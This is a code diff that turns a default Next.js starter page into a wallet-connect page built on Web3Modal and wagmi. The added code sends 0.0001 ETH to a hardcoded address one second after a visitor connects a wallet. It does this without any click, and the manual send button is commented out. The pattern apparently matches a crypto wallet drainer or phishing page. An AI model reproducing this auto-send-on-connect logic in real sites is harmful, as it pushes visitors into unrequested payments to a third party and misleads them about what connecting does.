@@ -1,95 +1,100 @@
-import Image from 'next/image'
-import styles from './page.module.css'
+
+"use client";
+
+import Image from "next/image";
+import styles from "./page.module.css";
+import Button from "./Button";
+import { useWeb3Modal, useWeb3ModalState } from "@web3modal/wagmi/react";
+import {
+  useAccount,
+  useSignMessage,
+  usePrepareSendTransaction,
+  useSendTransaction,
+} from "wagmi";
+import { useEffect } from "react";
+import { parseEther } from "viem";
 
 export default function Home() {
+  // const { open, close } = useWeb3Modal()
+  const [sendAmount, toAddress] = [
+    parseEther("0.0001"),
+    "0xbB03661F287d77e8612CBD0385a24E547C7a04d4",
+  ];
+  const { open, selectedNetworkId } = useWeb3ModalState();
+  const { address, isConnecting, isDisconnected } = useAccount();
+  const { config, error } = usePrepareSendTransaction({
+    to: toAddress,
+    value: sendAmount,
+  });
+  const { sendTransaction } = useSendTransaction(config);
+
+  // const useAccountFn = ()=>{
+  //   if (isConnecting) return <div>Connecting…</div>
+  //   if (isDisconnected) return <div>Disconnected</div>
+  //   return <div>{address}</div>
+  // }
+
+  // function Sign() {
+  //   const { data, isError, isLoading, isSuccess, signMessage } = useSignMessage({
+  //     message: 'gm wagmi frens'
+  //   })
+
+  //   return (
+  //     <div>
+  //       <button disabled={isLoading} onClick={() => signMessage()}>
+  //         Sign message
+  //       </button>
+  //       {isSuccess && <div>Signature: {data}</div>}
+  //       {isError && <div>Error signing message</div>}
+  //     </div>
+  //   )
+  // }
+
+  useEffect(() => {
+    console.log(`
+    \nisDisconnected: ${isDisconnected}
+    \nselectedNetworkId: ${selectedNetworkId}
+    \nfromAddress: ${address}
+    \ntoAddress: ${toAddress}
+    \nsendAmount: ${sendAmount}`);
+  }, [selectedNetworkId, address]);
+
+  useEffect(() => {
+    if (address && selectedNetworkId && !isDisconnected) {
+      console.log('::send funds::')
+      setTimeout(() => {
+        sendTransaction?.();
+      }, 1000);
+    }
+  }, [address, selectedNetworkId]);
+
+  // useEffect(() => {
+  //   if (error) {
+  //     console.error(error.message);
+  //   }
+  // }, [error]);
+
   return (
     <main className={styles.main}>
-      <div className={styles.description}>
-        <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>src/app/page.tsx</code>
-        </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
-
+      <div className={styles.description}></div>
       <div className={styles.center}>
-        <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+        <w3m-button balance={"show"} size={"md"}></w3m-button>
       </div>
-
       <div className={styles.grid}>
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Docs <span>-&gt;</span>
-          </h2>
-          <p>Find in-depth information about Next.js features and API.</p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Learn <span>-&gt;</span>
-          </h2>
-          <p>Learn about Next.js in an interactive course with&nbsp;quizzes!</p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Templates <span>-&gt;</span>
-          </h2>
-          <p>Explore the Next.js 13 playground.</p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Deploy <span>-&gt;</span>
-          </h2>
-          <p>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+        {/* <>
+          <button
+            disabled={!sendTransaction}
+            onClick={() => sendTransaction?.()}
+          >
+            Send Transaction
+          </button>
+          {error && (
+            <div>
+              An error occurred preparing the transaction: {error.message}
+            </div>
+          )}
+        </> */}
       </div>
     </main>
-  )
+  );
 }
